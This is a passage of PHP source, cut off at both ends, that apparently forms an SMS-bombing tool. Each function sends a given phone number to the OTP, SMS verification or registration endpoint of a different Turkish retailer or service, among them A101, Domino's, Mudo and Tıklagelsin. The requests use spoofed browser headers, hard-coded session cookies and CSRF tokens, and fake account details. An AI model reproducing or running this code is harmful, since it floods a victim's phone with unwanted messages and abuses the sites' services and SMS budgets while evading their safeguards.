curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.damattween.com',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.damattween.com',
    'referer: https://www.damattween.com/otp-login',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'csrftoken=qJO8Y1CUEwVQM70saPVY7bLWX41pJX4IMO7C7V8FZaOjK4d6sp5o9zewHvcpL6xi; usizy.sk=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiIxN2E4OGYxODg1N2QxMWVlOWE3YzEyOWUxN2FiNDc2OCJ9.7caFQ0y7gcm3ZqH2scauoW4zZgh1_lOEX4tDyCg-kOA; sessionid=nbz2e7tkrlal80u9yezab4v5jahawtoo');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'phone=0' . $gsm . '&code=');

$response = curl_exec($ch);

curl_close($ch);

}

function mopas($gsm){

$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://mopas.com.tr/sms/activation?mobileNumber=' . $gsm . '&pwd=&checkPwd=');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/plain, */*; q=0.01',
    'Accept-Language: tr-TR,tr;q=0.8',
    'Connection: keep-alive',
    'Referer: https://mopas.com.tr/login',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Sec-GPC: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'X-Requested-With: XMLHttpRequest',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'JSESSIONID=2CFDEA78D068AFB9620428D1C0CB9216; iszone_updated=false; delivery_zone=mopas; BNI_persistence=-oMuwJWTY8xe9gAXchZ7LZIV_9pUzvcHq4fB0KCvuV1cM6UJrhvXajog7HuniIzXPVd-0J2eO82uc8TcndacvQ==; BNES_iszone_updated=DdFhFId7Ym+8qqVjeLjeMn2mYE+/aCTRNTir/NcIYiiVb0ZvtIHGT99OCwqt3gBOqvwfUj3rZ89G36SWXVup2g==; BNES_delivery_zone=RNJQEx9bGp3kS371uUBN789pW+aXHPRFf5QnMVYVbmm4Ql1mhjT/cvyk/FVx3uji4u5DoCKpfgg=; BNES_BNES_iszone_updated=+XPa+3/dHaW+eyNSvlv8kHBhjfwHmL2sEccYU0Kk803GNsY424ws3UuP1GUjKN6wXqXYT3hJa3cW7fONGf7kn7b0quBqn0Mo0C6EZIhVuX5iZedeajkVveEUOsdJVKKfuuS4qksQZcxTcX9eTo4H9dG20fcz6IbOj/L2skbP/ep3iMucU6UHadkuueabXGFA5J2kc5NSS/o=; BNES_BNES_delivery_zone=Wl+wwn070RTt0IyUrrRPz0ybD75wxOUArPuVJcV+NglSQSjIp/z+Ix85dIRGRQPtFuLs4TNhrvK4e3T+yXgTyn9nO30Y1R0G0eXHmJ/kiKneKtfIxg2V3bCbCrITYhEvq+DuFs43bjyAWeCdKaCByxTORe9zqqx0i3DndwWrk3TTFfP3cwPXsg==; x-bni-fpc=57dc8c5b1b286b5ebdea99bdc4067d3f; mopas-cart=7d345879-daf7-4f5a-a70d-2a41397c03c8; x-bni-rncf=1700248697842; BNES_JSESSIONID=uESGZvc9Rh3lUm25uu1gwnwe/RYq3kt1mmG6qJxVQ9qn/tiLCpZW2ynY4GKZOnbxClJ7xlqit/ns6qqNTWd9bdibKsXaHiZbT0jVyn0DHKE=; BNES_mopas-cart=lH9AVzVggCAwRBzJwv/OWy9TlfpnXNklHifanElfbA6pFOzvjqSy+cFl6cvF9mk0Iy6SbEhHxS+KeIvE8afGhq8O98a62/DlWtJ9xGxB/a4oUpMlbewtlg==; BNES_BNES_JSESSIONID=zvU+YQqGLOH1e2Rye1PoIu7wGZ3J61ism4UX1cHO3aWfD9bYsyHIXHszxJMlL9d279WPul6H3/bjtGEbbEgzUjnOKVhRG11OwliXatvfDjVez8kFJGph9fkwXNj3HKuOJSoF+zfsazV9FsTPZGwQRQUSLXVGvRurLAXBfT7Zg7toL7VYLw74KjftcFUYdSoMsF7wo9rEEOz2fPcIyKmh+pLgbbZJLOV3; BNES_BNES_mopas-cart=zKvSSCw8UD8vtbX4jHUYMoKi4tM8uXpE/4K2dsX1xwzrexDjE9I0L8tdA/OZ0FV9bMcut1ks2WWkcCouX+wbr3ssmvml2015iQWlenR1SiQ4uJDb0N6bdUeAqxlpEUo79l6fiGI4ieIt4ERWL71d5y8JB+M566iOsF7ezXe/R5lzshd1lYEGoWplA0KFFjeWh3DYZ0Bwck2SeijecbwOSC/AiqrmCIrEQ5zjAxO8LA4=');

$response = curl_exec($ch);

curl_close($ch);
}

function salonrandevu($gsm){
    $ch = curl_init();
    $randomEmail = generateRandomEmail();
    curl_setopt($ch, CURLOPT_URL, 'https://api.salonrandevu.com/api/v1/register');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: api.salonrandevu.com',
        'accept: */*',
        'accept-language: tr-TR,tr;q=0.8',
        'content-type: application/json;charset=UTF-8',
        'origin: https://salonrandevu.com',
        'referer: https://salonrandevu.com/',
        'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'sec-gpc: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'accept-encoding: gzip',
    ]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone":"' . $gsm . '","mail":"' . $randomEmail . '","dialCode":"+90"}');    
$response = curl_exec($ch);
curl_close($ch);
}

function enzahome($gsm){
    $ch = curl_init();
    $randomEmail = generateRandomEmail();
    curl_setopt($ch, CURLOPT_URL, 'https://www.enzahome.com.tr/users/register/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: www.enzahome.com.tr',
        'accept: application/json, text/plain, */*',
        'accept-language: tr-TR,tr;q=0.5',
        'content-type: application/json;charset=UTF-8',
        'origin: https://www.enzahome.com.tr',
        'referer: https://www.enzahome.com.tr/users/auth/?next=/account/',
        'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'sec-gpc: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'x-csrftoken: EJavrvCDkvi94ViAQOfgX8yGSAGkkmlluqLiE0si7qJQCvVjXYY9aWegy8Mz76pS',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_COOKIE, 'csrftoken=jr4tm9Gd3n2lwQ1I9QT7netH1ZTiuXHb98FgzEwSQit24qErg0C0A29hHxZxhHLI; sessionid=w147h1mlyvq7i9tp3l4idfta3evwxo4e; personaclick_session_code=JgZrGUh6ma; personaclick_device_id=BPJMmiT3jx; personaclick_lazy_recommenders=true; personaclick-popup-183=showed; personaclick_session_last_act=1700251756097');
    curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"email\":\"$randomEmail\",\"first_name\":\"meth\",\"last_name\":\"yılmaz\",\"password\":\"methyok123!\",\"phone\":\"0" . $gsm . "\",\"sms_allowed\":true,\"confirm\":true,\"email_allowed\":true,\"call_allowed\":true}");
    $response = curl_exec($ch);
    curl_close($ch);
}

function samsonite($gsm){
    $ch = curl_init();
    $randomEmail = generateRandomEmail();
    curl_setopt($ch, CURLOPT_URL, 'https://www.samsonite.com.tr/users/registration/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: www.samsonite.com.tr',
        'accept: */*',
        'accept-language: tr-TR,tr;q=0.7',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'origin: https://www.samsonite.com.tr',
        'referer: https://www.samsonite.com.tr/register/?next=/',
        'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'sec-gpc: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'x-requested-with: XMLHttpRequest',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_COOKIE, 'csrftoken=NejtFpi1FekUIBzQ6zhganC00yWCzNOxXuV9mo3215EhJBqBSNw1aFDAZTLBrPfS; ajs_group_id=null; ajs_user_id=%22None%22; ajs_anonymous_id=%2267d1b953-4749-433a-bc7e-ab1e18033fbe%22; strw-1941-vt=0_1700251912996; strw-1941-tpvc=2; strw-1941-spvc=2; strw-1941-ttt=33; strw-1941-stt=33; strw-1941-ptt=33');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrfmiddlewaretoken=6pZYhgNu4AJbSrgYiz0lloMOOG5CoolsgFBEYfyvqr3yTr7J4Nf6lGNoN1UBgqMN&first_name=meth&last_name=y%C4%B1lmaz&email=' . $randomEmail . '&date_of_birth=2000-07-04&phone_country=%2B90&phone=%2B90' . $gsm . '&password=methyok123!&email_allowed=true&sms_allowed=true&confirm=true');
    $response = curl_exec($ch);  
    curl_close($ch);
}

function tiklagelsin($gsm){
    $ch = curl_init();
    $randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://www.tiklagelsin.com/user/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.tiklagelsin.com',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.8',
    'content-type: application/json',
    'origin: https://www.tiklagelsin.com',
    'referer: https://www.tiklagelsin.com/a/',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-device-type: 3',
    'x-merchant-type: 0',
    'x-no-auth: true',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"GENERATE_OTP","variables":{"phone":"+90' . $gsm . '","challenge":"40f33547-221e-4add-9e6e-d64a70d3ecb7","deviceUniqueId":"web_0cc1628d-3315-47f8-8033-92a13d1db297"},"query":"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\\n  generateOtp(\\n    phone: $phone\\n    challenge: $challenge\\n    deviceUniqueId: $deviceUniqueId\\n  )\\n}\\n"}');

$response = curl_exec($ch);

curl_close($ch);
}

function hamidiyesu($gsm){
$ch = curl_init();
$randomEmail = generateRandomEmail();
curl_setopt($ch, CURLOPT_URL, 'https://onlinebayi.hamidiye.istanbul/api/register/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: onlinebayi.hamidiye.istanbul',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.7',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://siparis.hamidiye.istanbul',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'first_name=meth&last_name=y%C4%B1lmaz&phone=' . $gsm . '&email=' . $randomEmail . '&password=methyokki123!&campaign_permissions=false&mobile_notification=true&sms_notification=true&email_notification=true');
$response = curl_exec($ch);
curl_close($ch);
}

function a101($gsm){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.a101.com.tr/users/otp-login/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.a101.com.tr',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.6',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.a101.com.tr',
    'referer: https://www.a101.com.tr/login/?next=/login/&register=true',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'csrftoken=mB7usCdLfJUOTFWsKb6i9xetlLxj8jEq2SPi1hcfnjDFrIz3UcanQ9mhtoBTCuIr; ajs_group_id=null; ajs_user_id=%22None%22; ajs_anonymous_id=%2206c372ca-5880-47be-9510-7c3ac8a828f7%22; personaclick_session_code=Xz8NaEcQVF; personaclick_device_id=qZj7lf4Fb1; personaclick_lazy_recommenders=true; markalarabVisitorSegment=B; personaclick_session_last_act=1700853091533');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'phone=0' . $gsm . '&next=%2Flogin%2F');
$response = curl_exec($ch);
curl_close($ch);
}

function zubizu($gsm){
$randomEmail = generateRandomEmail();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.zubizu.com/Registration/Register');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: application/json, text/javascript, */*; q=0.01',
    'Accept-Language: tr-TR,tr;q=0.8',
    'Connection: keep-alive',
    'Content-Type: application/json; charset=UTF-8',
    'Origin: https://www.zubizu.com',
    'Referer: https://www.zubizu.com/uye-olun',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Sec-GPC: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'X-Requested-With: XMLHttpRequest',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'VL_FirstVisitTime=2023-11-25 21:51:07; VL_VisitStartTime=2023-11-25 21:51:07; VL_TotalVisit=1; OfferMiner_ID=RUMLETQUTWIQLEMY20231125215107; OM_INW=1; OMB_New=1; VL_FirstReferrer=https://www.google.com/?; VL_LastPageViewTime=2023-11-25 21:51:37; VL_LastPVTimeForTD=2023-11-25 21:51:37; VL_TotalDuration=30; VL_TotalPV=2; VL_PVCountInVisit=2; OM_rDomain=https%3A%2F%2Fwww.zubizu.com%2F%3F; G_ENABLED_IDPS=google');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"MobilePhone":"' . $gsm . '","PhoneNumberCode":90,"CountryCode":"tr","Email":"' . $randomEmail . '"}');
$response = curl_exec($ch);
curl_close($ch);
}

function dsmart($gsm){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api-crm4.ercdn.com/membership/verification/send?key=ac3f095f717f2665f3e8787d8f62ebc1');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: api-crm4.ercdn.com',
    'accept: application/json, text/plain, */*',
    'accept-language: tr-TR,tr;q=0.8',
    'content-type: application/json',
    'origin: https://www.dsmartgo.com.tr',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"CodeType":"PreVerification","Method":"Sms","Language":"TR","Mobile":"+90'. $gsm .'"}');
$response = curl_exec($ch);
curl_close($ch);
}

function netspeed($gsm){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.netspeed.com.tr/Home/CallUs');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.netspeed.com.tr',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.8',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.netspeed.com.tr',
    'referer: https://www.netspeed.com.tr/',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=muhammet+elmas&phone='. $gsm .'');
$response = curl_exec($ch);
curl_close($ch);
}

function houseofsuperstep($gsm){
$randomEmail = generateRandomEmail();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.houseofsuperstep.com/users/register/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.houseofsuperstep.com',
    'accept: application/json, text/plain, */*',
    'accept-language: tr-TR,tr;q=0.6',
    'content-type: application/json',
    'origin: https://www.houseofsuperstep.com',
    'referer: https://www.houseofsuperstep.com/users/login/?next=/',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-csrftoken: knUjGtwQSg6tMpckBLMK3lJcSw1Et6L0P6QDskACJ3BzZaBLnLfkazGCjFM8gBuV',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'csrftoken=bunocH01wIaTkh0G27d4DYLqQegSfdZHGdjIYy4NnvFZx2p7O7GEKcIQhn1m2IIC; sessionid=s3wbad6lvys1slnphkoi9etjb8tjws94');
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"email\":\"' . $randomEmail . '\",\"first_name\":\"meth\",\"last_name\":\"yılmaz\",\"date_of_birth\":\"1997-02-01\",\"password\":\"Skidlamer123!\",\"phone\":\"0' . $gsm . '\",\"sms_allowed\":true,\"email_allowed\":true,\"gender\":\"male\",\"confirm\":true,\"kvkk_confirm\":true,\"call_allowed\":true}");
$response = curl_exec($ch);
curl_close($ch);
}

function mudo($gsm){
$randomEmail = generateRandomEmail();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.mudo.com.tr/users/register/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.mudo.com.tr',
    'accept: application/json, text/plain, */*',
    'accept-language: tr-TR,tr;q=0.9',
    'content-type: application/json',
    'origin: https://www.mudo.com.tr',
    'referer: https://www.mudo.com.tr/users/register/?next=',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-csrftoken: 41z0lriVXri2WlAH0QF093K1K2O2sw3bC0RUHVaOdahevfDJYSPsLeuTUytcAZr6',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'csrftoken=MenjctKHnlj15m8u3bNUmatiKikzNxYikdFdyXCAD4idEgbw1dXmYldaUOZJV0md');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"' . $randomEmail . '","sms_allowed":true,"email_allowed":true,"first_name":"meth","last_name":"yılmaz","date_of_birth":"1999-04-03","gender":null,"confirm":true,"password":"Skidlamer123!","phone":"' . $gsm . '","add_loyalty":true}');
$response = curl_exec($ch);
curl_close($ch);
}

function occasion($gsm){
$randomEmail = generateRandomEmail();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.occasion.com.tr/users/registration/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.occasion.com.tr',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.6',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.occasion.com.tr',
    'referer: https://www.occasion.com.tr/register/?next=/account/profile/',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'csrftoken=6gg14o35ie8Yuar25AWTLdbNXKs3p5exrNDODQJunAyWth3WD9E59rIY7zkudIkW; ajs_group_id=null; ajs_user_id=%22None%22; ajs_anonymous_id=%2264db5e47-8447-4a51-8301-5b53af116e55%22');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'next=%2Faccount%2Fprofile%2F&date_of_birth=17-08-1987&first_name=meth&last_name=yilmaz&email=' . $randomEmail . '&phone=0'. $gsm .'&gender=male&password=Skidlamer123!&is_allowed=true&confirm=true&sms_allowed=true&email_allowed=true&call_allowed=true&permissions=true&sms_allowed=true&email_allowed=true&call_allowed=true');
$response = curl_exec($ch);
curl_close($ch);
}

function sportive($gsm){
$randomEmail = generateRandomEmail();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.sportive.com.tr/users/registration/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.sportive.com.tr',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.8',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.sportive.com.tr',
    'referer: https://www.sportive.com.tr/login/',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'csrftoken=ByQBpHJYYq6Mh900rucgAyXSc8pdW3Btiszk7hlKAo7k1Mzt44YfP0xpeqQ4U3vD; ajs_group_id=null; ajs_user_id=%22None%22; ajs_anonymous_id=%2264d733bd-df50-463b-a70d-4d6074214c9c%22');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrfmiddlewaretoken=OSlomaD8qVMpWKZLS3Ykm07aHzrKV1M7vM474KfU2TNXGnyevDKjBsHHJRSBT1Gh&first_name=meth&last_name=y%C4%B1lmaz&email=' . $randomEmail . '&phone=0'. $gsm .'&date_of_birth=1994-06-16&password=Skidlamer123!&email_allowed=false&sms_allowed=true&contact_allowed=true&confirm=true&confirm-2=true&next=');
$response = curl_exec($ch);
curl_close($ch);
}

function dominos($gsm){
$randomEmail = generateRandomEmail();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://frontend.dominos.com.tr/api/customer/sendOtpCode');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: frontend.dominos.com.tr',
    'accept: application/json, text/plain, */*',
    'accept-language: tr-TR,tr;q=0.9',
    'appversion: WEB-3.0',
    'authorization: Bearer',
    'content-type: application/json',
    'origin: https://www.dominos.com.tr',
    'referer: https://www.dominos.com.tr/',
    'sec-ch-ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'Dominos.appVersionPublic=1.4.35; cf_clearance=ZhCBWgbRaXdQlS7pyq6ZvvkLwvpMtI1msCnGCd4Z1qw-1700955013-0-1-771ed29a.ba3ab83.c1b71343-0.2.1700955013');
